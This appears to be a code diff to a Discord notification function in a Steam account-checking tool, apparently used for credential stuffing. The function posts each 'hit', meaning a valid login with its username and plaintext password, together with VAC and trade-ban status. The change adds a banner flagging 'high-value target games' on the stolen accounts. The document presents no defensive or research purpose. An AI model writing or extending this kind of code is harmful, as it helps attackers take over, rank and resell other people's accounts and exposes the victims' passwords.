@@ -37,12 +37,20 @@ def build_discord_embed(item: Dict[str, Any]) -> Dict[str, Any]:
     avatar_url = item.get("avatar_url", "") or DEFAULT_STEAM_ICON
     games = item.get("games", [])
 
+    matched_targets = item.get("matched_targets", [])
     is_2fa = (status == "2FA_HIT")
 
-    # Embed color: Vibrant Green for Direct Login, Amber Gold for 2FA Guarded
-    color = 0xFFAB00 if is_2fa else 0x00E676
+    # Embed color: Vibrant Neon Green for Target Direct Hit, Emerald for regular, Amber for 2FA
+    if matched_targets and not is_2fa:
+        color = 0x00FF66
+        title_prefix = "🎯 [TARGET HIT - DIRECT ACCESS]"
+    elif is_2fa:
+        color = 0xFFAB00
+        title_prefix = "🛡️ [2FA GUARDED HIT]"
+    else:
+        color = 0x00E676
+        title_prefix = "✅ [VALID DIRECT HIT]"
 
-    title_prefix = "🛡️ [2FA GUARDED HIT]" if is_2fa else "🎯 [VALID DIRECT HIT]"
     title = f"{title_prefix} - {persona} ({username})"
 
     profile_link = f"https://steamcommunity.com/profiles/{steamid}" if steamid else "N/A"
@@ -51,7 +59,26 @@ def build_discord_embed(item: Dict[str, Any]) -> Dict[str, Any]:
     trade_str = "❌ BANNED" if trade_banned else "✅ CLEAN"
     limited_str = "⚠️ LIMITED ($5 Rule)" if is_limited else "✅ UNRESTRICTED"
 
-    fields: List[Dict[str, Any]] = [
+    fields: List[Dict[str, Any]] = []
+
+    # Prominent Top Banner for High-Value Target Games
+    if matched_targets:
+        target_lines = []
+        for tg in matched_targets[:12]:
+            name = tg.get("name") if isinstance(tg, dict) else str(tg)
+            hours = tg.get("hours", "0") if isinstance(tg, dict) else "0"
+            h_str = f" ({hours} hrs)" if hours and str(hours) != "0" else ""
+            target_lines.append(f"⭐ **{name}**{h_str} `[PAID]`")
+        if len(matched_targets) > 12:
+            target_lines.append(f"*... +{len(matched_targets) - 12} more high-value targets!*")
+
+        fields.append({
+            "name": f"🎯 HIGH-VALUE TARGET GAMES DETECTED ({len(matched_targets)})",
+            "value": "\n".join(target_lines),
+            "inline": False
+        })
+
+    fields.extend([
         {
             "name": "👤 Account Credentials",
             "value": f"`{username}` : ||`{password}`||",
@@ -82,7 +109,7 @@ def build_discord_embed(item: Dict[str, Any]) -> Dict[str, Any]:
             "value": f"VAC: **{vac_str}** | Trade: **{trade_str}**\nAccount: {limited_str}",
             "inline": False
         },
-    ]
+    ])
 
     # Detailed Games Breakdown Field
     if games:
